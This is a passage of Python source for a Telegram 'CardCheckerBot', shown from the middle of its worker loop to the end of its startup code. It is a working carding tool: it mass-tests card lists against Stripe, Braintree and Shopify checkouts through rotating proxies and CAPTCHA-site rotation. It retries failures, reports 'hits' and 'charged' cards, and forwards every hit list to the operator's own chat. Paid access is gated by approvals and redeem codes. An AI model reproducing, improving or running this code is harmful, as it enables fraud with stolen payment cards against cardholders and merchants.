                            f"⏹ No progress for {JOB_NO_PROGRESS_TIMEOUT // 60} minutes. Auto-cancelled."
                        )
                        job['stop'] = True
                        break

                    if gateway in ['stripe', 'braintree'] and not self.is_user_approved(user_id):
                        await self.safe_send_message(chat_id, "⏹ Access expired.")
                        job['stop'] = True
                        break

                    if gateway == 'shopify' and not self.is_shopify_approved(user_id):
                        await self.safe_send_message(chat_id, "⏹ Shopify access expired.")
                        job['stop'] = True
                        break

                    if job.get('stop'):
                        break

                    chash = f"{user_id}_{card}"
                    if chash in self._processing_cards:
                        continue
                    self._processing_cards.add(chash)

                    try:
                        if gateway in ['stripe', 'braintree']:
                            raw = await self.send_card_to_payu(card, gateway=gateway)
                            if self.is_approved(raw):
                                is_charged = self.is_charged_response(raw)
                                if gateway == 'stripe':
                                    fmt = await self.format_stripe_approved(card, raw, include_charge=True)
                                    await self.safe_send_message(chat_id, fmt)
                                    self.stats["total_approved"] += 1
                                    approved_cards.append(card)
                                    self.update_user_stats(user_id, approved=1)
                                    if is_charged:
                                        charged_cards.append(card)
                                        self.stats["total_charged"] += 1
                                        self.update_user_stats(user_id, charged=1)
                                else:
                                    fmt = await self.format_braintree_charged(card, raw)
                                    await self.safe_send_message(chat_id, fmt)
                                    self.stats["total_approved"] += 1
                                    approved_cards.append(card)
                                    charged_cards.append(card)
                                    self.stats["total_charged"] += 1
                                    self.update_user_stats(user_id, approved=1, charged=1)

                        elif gateway == 'shopify':
                            # Periodically unblock CAPTCHA-cooled sites
                            if idx % 10 == 1:
                                await self._unblock_captcha_sites()
                            # Check if all sites are dead every 10 cards — stop job instead of burning cards
                            if idx % 10 == 1 and not self.working_sites and all(s in self.dead_sites for s in self.owner_sites):
                                await self.safe_send_message(
                                    chat_id,
                                    "⛔ <b>ALL SITES ARE DEAD</b> — stopping mass job.\n"
                                    f"Dead: {len(self.dead_sites)} sites. Run /test_sites to refresh.",
                                    parse_mode='html'
                                )
                                job['stop'] = True
                                break

                            proxy = await self.get_next_proxy_async(user_id)
                            # FIX: Pass user's selected amount filter instead of hardcoded "all"
                            user_filter = self.user_amount_filter.get(user_id, "all")
                            # Per-card timer for diagnostics
                            card_start = time.time()
                            # OPTIMISED: removed asyncio.wait_for wrapper — API already has its own timeout
                            try:
                                raw, ok, info = await self.shopify_check_card(
                                    card, proxy_str=proxy, user_id=user_id, amount_filter=user_filter
                                )
                            except asyncio.TimeoutError:
                                raw, ok, info = "ERROR", False, {"reason": "Card timed out (mass job guard)", "site": "n/a"}
                            card_elapsed = time.time() - card_start
                            # Log per-card timing — helps diagnose fast-fail (< 1s = not reaching payment)
                            logger.info(
                                f"[worker] Card {card[:6]}... | {card_elapsed:.2f}s | "
                                f"site={info.get('site', 'n/a')} | result={raw} | reason={info.get('reason', '')[:50]}"
                            )
                            # Warn if cards are completing suspiciously fast (not reaching payment step)
                            if card_elapsed < FAST_FAIL_THRESHOLD_SECS and raw != "No sites":
                                logger.warning(
                                    f"[worker] ⚠️ FAST-FAIL: Card completed in {card_elapsed:.2f}s — "
                                    f"checkout likely not reaching payment step. site={info.get('site', 'n/a')}"
                                )
                            if ok:
                                self.throttle.record_success()
                                fmt = await self.format_shopify_result(card, True, info, proxy)
                                await self.safe_send_message(chat_id, fmt)
                                self.stats["total_approved"] += 1
                                approved_cards.append(card)
                                self.update_user_stats(user_id, approved=1)
                                if raw == "CHARGED":
                                    charged_cards.append(card)
                                    self.stats["total_charged"] += 1
                                    self.update_user_stats(user_id, charged=1)
                            else:
                                reason = info.get("reason", "Unknown")
                                # Retryable failures → queue for retry (up to MAX_CARD_RETRIES)
                                # FIXED: use dict methods instead of getattr/hasattr (job is a dict, not an object)
                                retry_counts = job.setdefault('_retry_counts', {})
                                retry_count = retry_counts.get(card, 0)
                                is_retryable = raw in ("All sites failed", "No sites", "ERROR")
                                if is_retryable and retry_count < MAX_CARD_RETRIES:
                                    retry_counts[card] = retry_count + 1
                                    # Re-queue card for retry at end of cards list
                                    cards.append(card)
                                    total += 1  # Adjust total to account for retry
                                    self.throttle.record_error()
                                    logger.info(
                                        f"[worker] ♻️ Re-queued card {card[:6]}... for retry "
                                        f"{retry_count + 1}/{MAX_CARD_RETRIES} | reason={reason}"
                                    )
                                else:
                                    if is_retryable:
                                        self.throttle.record_error()
                                    else:
                                        self.throttle.record_success()
                                    logger.warning(
                                        f"Shopify failed for {card[:6]}... | site={info.get('site', 'n/a')} "
                                        f"| proxy={(proxy or 'none')[:40]} | reason={reason} | {card_elapsed:.2f}s"
                                    )
                                    declined_count += 1

                    except Exception as card_err:
                        logger.warning(f"Card error ({card[:6]}...): {card_err}")
                    finally:
                        self._processing_cards.discard(chash)

                    processed = idx
                    job['processed'] = processed
                    job['declined_count'] = declined_count
                    job['approved_cards'] = approved_cards
                    self.stats["total_checked"] += 1
                    self.update_user_stats(user_id, checked=1)
                    no_progress_deadline = time.time() + JOB_NO_PROGRESS_TIMEOUT

                    # Update progress UI every 5 cards to reduce Telegram API load
                    if processed % 5 == 0 or processed == total:
                        elapsed = datetime.now() - start_time
                        # FIX: Real ETA based on actual elapsed time per card
                        elapsed_secs = elapsed.total_seconds()
                        if processed > 0 and elapsed_secs > 0:
                            avg_per_card = elapsed_secs / processed
                            remaining_secs = (total - processed) * avg_per_card
                        else:
                            remaining_secs = 0
                        elapsed_str = str(elapsed).split('.')[0]
                        remaining_str = str(timedelta(seconds=int(remaining_secs))).split('.')[0]
                        try:
                            await self.pulse_progress(
                                chat_id, job['message_id'], processed, total,
                                card, job_id, elapsed_str, remaining_str
                            )
                        except:
                            pass
                    # Only throttle for non-Shopify gateways (Shopify is already timeout-guarded)
                    if gateway != 'shopify':
                        await self.throttle.wait()

                # ━━━━━━ COMPLETION ━━━━━━
                try:
                    user_entity = await self.bot_client.get_entity(user_id)
                    username = user_entity.username or "No username"
                    user_link = f"@{username}" if user_entity.username else f"ID: <code>{user_id}</code>"
                except:
                    user_link = f"ID: <code>{user_id}</code>"

                if approved_cards:
                    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                    if gateway == 'stripe':
                        user_file = os.path.join(PROCESSED_DIR, f"approved_{user_id}_{ts}.txt")
                        cap = "✅ Stripe Approved"
                    elif gateway == 'braintree':
                        user_file = os.path.join(PROCESSED_DIR, f"bt_approved_{user_id}_{ts}.txt")
                        cap = "�� Braintree Approved"
                    else:
                        user_file = os.path.join(PROCESSED_DIR, f"shopify_approved_{user_id}_{ts}.txt")
                        cap = "✅ Shopify Approved"

                    with open(user_file, "w") as f:
                        f.write("\n".join(approved_cards))

                    rate = len(approved_cards) / total * 100
                    rate_w = 10
                    rf = int(rate_w * (rate / 100)) if rate <= 100 else rate_w
                    rate_bar = '█' * rf + '░' * (rate_w - rf)

                    summary = (
                        "╔══════════════════════════════╗\n"
                        "║   ✅ JOB COMPLETED            ║\n"
                        "╚══════════════════════════════╝\n\n"
                        "┏━━━━━ 📊 Results ━━━━━━━━━━┓\n"
                        f"┃ 📃 Total:    <code>{total:,}</code>\n"
                        f"┃ ✅ Hits:     <code>{len(approved_cards):,}</code>\n"
                    )
                    if charged_cards:
                        summary += f"┃ 💰 Charged:  <code>{len(charged_cards):,}</code>\n"
                    if gateway == 'shopify':
                        summary += f"┃ ❌ Declined: <code>{declined_count:,}</code>\n"
                    summary += (
                        f"┃ 📈 Rate:     <code>[{rate_bar}] {rate:.1f}%</code>\n"
                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                    )

                    await self.safe_send_message(chat_id, summary)
                    await self.bot_client.send_file(chat_id, user_file, caption=cap)
                    os.remove(user_file)

                    owner_file = os.path.join(PROCESSED_DIR, f"owner_{gateway}_{user_id}_{ts}.txt")
                    with open(owner_file, "w") as f:
                        f.write(f"=== {gateway.upper()} APPROVED ===\n")
                        f.write(f"User: {user_link}\n")
                        f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write(f"Hits: {len(approved_cards)}\n{'='*40}\n")
                        for c in approved_cards:
                            f.write(f"{c}\n")

                    await self.bot_client.send_file(
                        FORWARD_CHAT_ID, owner_file,
                        caption=f"📊 {gateway.upper()} | {user_link} | ✅ {len(approved_cards)} hits",
                        parse_mode='html'
                    )
                    os.remove(owner_file)

                    if charged_cards:
                        cf = os.path.join(PROCESSED_DIR, f"CHARGED_{gateway}_{user_id}_{ts}.txt")
                        with open(cf, "w") as f:
                            f.write(f"=== {gateway.upper()} CHARGED ===\n")
                            f.write(f"User: {user_link}\nCount: {len(charged_cards)}\n{'='*40}\n")
                            for c in charged_cards:
                                f.write(f"{c}\n")
                        await self.bot_client.send_file(
                            FORWARD_CHAT_ID, cf,
                            caption=f"💰 {gateway.upper()} CHARGED | {user_link} | {len(charged_cards)} cards",
                            parse_mode='html'
                        )
                        os.remove(cf)
                else:
                    summary = (
                        "╔══════════════════════════════╗\n"
                        "║   ✅ JOB COMPLETED            ║\n"
                        "╚══════════════════════════════╝\n\n"
                        f"┃ 📃 Total: <code>{total:,}</code>\n"
                        f"┃ ❌ Hits:  <code>0</code>\n"
                    )
                    if gateway == 'shopify':
                        summary += f"┃ 🚫 Declined: <code>{declined_count:,}</code>\n"
                    summary += "┃ 📈 Rate: <code>0%</code>"
                    await self.safe_send_message(chat_id, summary)
                    await self.safe_send_message(FORWARD_CHAT_ID,
                        f"📊 {gateway.upper()} done | {user_link} | ❌ No hits")

                try:
                    os.rename(filepath, os.path.join(PROCESSED_DIR, os.path.basename(filepath)))
                except:
                    pass

            except Exception as e:
                logger.exception(f"Worker {wid} error: {e}")
                if chat_id:
                    try:
                        await self.safe_send_message(chat_id, f"❌ Error: <code>{str(e)[:100]}</code>")
                    except:
                        pass
            finally:
                if job_id:
                    self.active_jobs.pop(job_id, None)
                if got_job:
                    try:
                        self.task_queue.task_done()
                    except ValueError:
                        pass

    # ═══════════════ Run ═══════════════
    async def run_with_reconnect(self):
        while True:
            try:
                self.bot_client = TelegramClient("bot_session", API_ID, API_HASH)
                await self.bot_client.start(bot_token=BOT_TOKEN)
                self.user_client = TelegramClient("checker_session", API_ID, API_HASH)
                if os.path.exists("checker_session.session"):
                    await self.user_client.start()
                else:
                    await self.user_client.start(phone=PHONE_NUMBER)

                # No periodic site health check — sites are trusted as-is
                for i in range(NUM_WORKERS):
                    self.worker_tasks.append(asyncio.create_task(self.worker_loop(i)))
                bot_task = asyncio.create_task(self.start_bot())
                await asyncio.gather(bot_task, *self.worker_tasks)
            except (ConnectionError, errors.RPCError, OSError) as e:
                logger.error(f"Connection lost: {e}. Reconnecting in 10s...")
                await asyncio.sleep(10)
                for t in self.worker_tasks:
                    t.cancel()
                if self.bot_client:
                    await self.bot_client.disconnect()
                if self.user_client:
                    await self.user_client.disconnect()
                self.worker_tasks.clear()
                continue
            except Exception as e:
                logger.exception(f"Fatal: {e}")
                break
            finally:
                await self.close_http_session()

    def get_uptime(self) -> str:
        delta = datetime.now() - self.start_time
        days = delta.days
        hours = delta.seconds // 3600
        minutes = (delta.seconds % 3600) // 60
        if days > 0:
            return f"{days}d {hours}h"
        elif hours > 0:
            return f"{hours}h {minutes}m"
        else:
            return f"{minutes}m"

    async def run(self):
        self.load_users()
        self.load_user_stats()
        self.load_redeem_codes()
        self.load_owner_sites()
        if self.owner_sites:
            # FIX: Prefer tested working sites if available, else trust all uploaded sites
            loaded = self.load_working_sites_from_file()
            if loaded > 0:
                self.dead_sites = set()
                self._sites_ready = True
                logger.info(f"✅ Loaded {loaded} TESTED working sites from working_sites file")
            else:
                self.working_sites = list(self.owner_sites)
                self.dead_sites = set()
                self._sites_ready = True
                logger.info(f"✅ Loaded {len(self.working_sites)} sites (all trusted — run /test_sites to validate)")
            # OPTIMISED: only prefetch site prices if cache doesn't already cover all sites
            sites = list(self.good_sites) if self.good_sites else list(self.working_sites)
            uncached = [s for s in sites if s not in self._site_price_cache]
            if uncached:
                try:
                    await self.prefetch_site_prices()
                except Exception as e:
                    logger.warning(f"⚠️ Price prefetch failed (non-critical): {e}")
            else:
                logger.info(f"[startup] Price cache already full ({len(sites)} sites), skipping prefetch")
        await self.run_with_reconnect()


if __name__ == "__main__":
    bot = CardCheckerBot()
    try:
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        logger.info("Shutdown.")
                    
